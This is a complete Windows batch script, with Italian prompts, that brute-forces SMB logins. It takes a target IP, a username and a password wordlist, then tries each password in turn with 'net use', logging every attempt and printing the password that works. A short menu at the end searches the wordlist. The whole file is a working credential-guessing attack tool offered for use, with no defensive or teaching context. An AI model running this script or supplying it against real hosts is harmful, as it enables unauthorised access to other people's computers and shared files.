@echo off
cls
title SMB BruteForcer
color A
echo.





echo ==========================================

echo    IP LOCALE

echo ==========================================

for /f "tokens=2 delims=:" %%a in ('ipconfig ^| findstr /c:"IPv4"') do (

    echo    IP Locale: %%a

)

echo    Username PC: %USERNAME%

echo ==========================================

echo.



set /p ip="Inserisci IP: "

set /p user="Inserisci User: "

set /p wordlist="Inserisci la directory delle Password list + la passwordList che vuoi usare: "





echo -----------------------------------------

set /a count=1

for /f %%a in (%wordlist%) do (
set pass=%%a
call :attempt
)



color 0C

echo password non trovata :(

goto searchmenu



:success

echo.

color 2A

echo Password: %pass%

net use \\%ip% /d /y >nul 2>&1

goto searchmenu



:attempt

net use \\%ip% /user:%user% "%pass%" >nul 2>&1



echo [TENTATIVO %count%] [%pass%]

echo -----------------------------------------

set /a count=%count%+1

if %errorlevel% EQU 0 goto success 
goto :eof


:searchmenu
echo.
echo ==========================================
echo    RICERCA NELLA LISTA DI PASSWORD
echo ==========================================
set /p searchword="Inserisci una parola da cercare [premi Invio per uscire]: "
if "%searchword%"=="" (
    pause
    exit
)

findstr /c:"%searchword%" "%wordlist%" >nul
if %errorlevel% EQU 0 (
    echo La parola "%searchword%" e PRESENTE nella lista!
) else (
    echo La parola "%searchword%" NON e presente nella lista.
)
echo -----------------------------------------
goto searchmenu